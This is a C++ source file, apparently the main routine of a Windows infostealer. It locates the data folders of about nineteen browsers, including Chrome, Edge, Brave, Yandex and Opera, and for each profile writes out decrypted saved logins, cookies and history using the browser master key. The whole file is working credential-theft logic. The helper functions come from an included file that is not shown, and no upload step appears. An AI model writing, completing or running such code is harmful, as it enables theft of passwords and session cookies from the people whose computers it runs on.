#include "Tool.cpp"

namespace fs = std::filesystem;
std::map<std::string, fs::path> browser_paths;
std::string profiles[] = {
    "Default",
    "Profile 1",
    "Profile 2",
    "Profile 3",
    "Profile 4"};
fs::path original_path;

int main()
{
    std::ios_base::sync_with_stdio(0);
    std::cin.tie(0);
    std::cout.tie(0);

    char buffer[MAX_PATH];
    GetModuleFileName(NULL, buffer, MAX_PATH);
    std::string programPath(buffer);

    fs::path original_path = fs::path(programPath).parent_path();
    fs::current_path(original_path);

    const char *local_appdata_env = std::getenv("localappdata");
    fs::path local_appdata(local_appdata_env);

    const char *appdata_env = std::getenv("appdata");
    fs::path appdata(appdata_env);

    fs::create_directory("Files");
    fs::current_path("Files");

    browser_paths["amigo"] = local_appdata / "Amigo" / "User Data";
    browser_paths["torch"] = local_appdata / "Torch" / "User Data";
    browser_paths["kometa"] = local_appdata / "Kometa" / "User Data";
    browser_paths["orbitum"] = local_appdata / "Orbitum" / "User Data";
    browser_paths["cent-browser"] = local_appdata / "CentBrowser" / "User Data";
    browser_paths["7star"] = local_appdata / "7Star" / "7Star" / "User Data";
    browser_paths["sputnik"] = local_appdata / "Sputnik" / "Sputnik" / "User Data";
    browser_paths["vivaldi"] = local_appdata / "Vivaldi" / "User Data";
    browser_paths["google-chrome-sxs"] = local_appdata / "Google" / "Chrome SxS" / "User Data";
    browser_paths["google-chrome"] = local_appdata / "Google" / "Chrome" / "User Data";
    browser_paths["epic-privacy-browser"] = local_appdata / "Epic Privacy Browser" / "User Data";
    browser_paths["microsoft-edge"] = local_appdata / "Microsoft" / "Edge" / "User Data";
    browser_paths["uran"] = local_appdata / "uCozMedia" / "Uran" / "User Data";
    browser_paths["yandex"] = local_appdata / "Yandex" / "YandexBrowser" / "User Data";
    browser_paths["brave"] = local_appdata / "BraveSoftware" / "Brave-Browser" / "User Data";
    browser_paths["iridium"] = local_appdata / "Iridium" / "User Data";
    browser_paths["coc-coc"] = local_appdata / "CocCoc" / "Browser" / "User Data";
    browser_paths["operagx"] = appdata / "Opera Software" / "Opera GX Stable";
    browser_paths["opera"] = appdata / "Opera Software" / "Opera Stable";

    for (const auto &[browser, path] : browser_paths)
    {
        if (fs::exists(path))
        { // If the path exists
            std::vector<uint8_t> bMasterKey = GetBrowserMasterKey(path);
            if (bMasterKey.empty())
                continue;
            fs::create_directory(browser);

            for (const std::string profile : profiles)
            {
                fs::path profile_path = path / profile;
                if (fs::exists(profile_path))
                {
                    fs::create_directory(fs::path(browser) / profile);
                    WriteLoginsToFile(fs::path(browser) / profile, getLoginData(profile_path, bMasterKey));
                    WriteCookiesToFile(fs::path(browser) / profile, getCookies(profile_path, bMasterKey));
                    WriteHistoriesToFile(fs::path(browser) / profile, getHistory(profile_path));
                }
            }
        }
    }

    return 0;
}
